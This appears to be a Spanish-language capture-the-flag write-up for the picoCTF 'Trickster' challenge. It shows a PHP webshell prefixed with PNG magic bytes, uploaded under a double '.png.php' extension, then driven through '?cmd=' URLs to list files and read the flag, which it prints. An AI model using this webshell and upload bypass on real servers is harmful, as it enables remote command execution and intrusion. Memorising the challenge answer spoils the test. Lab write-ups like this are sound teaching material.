### Trickster

### Descripción

I found a web app that can help process images: PNG images only!
Additional details will be available after launching your challenge instance.
[The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:63235/)](http://atlas.picoctf.net:56565/)
### Solución

### Solucion 1

- Hacemos un codigo php webshell llamado myshell.php
- le hacemos un mv myshel.php myshell.png.php
- y adentro le ponemos 
```
PNG<?php if(isset($_REQUEST['cmd'])) system($_REQUEST['cmd']); ?>
```
subimos el archivo y le escribimos los siguientes links 
```
http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd=ls http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd=ls .. http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd= cat ../GAZWIMLEGU2DQ.txt
```
al final nos da esta flag 
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
### Notas

- Una **webshell** es un script malicioso (o una herramienta de administración, según quién la use) que se carga en un servidor web para permitir el acceso remoto y el control del sistema a través de un navegador.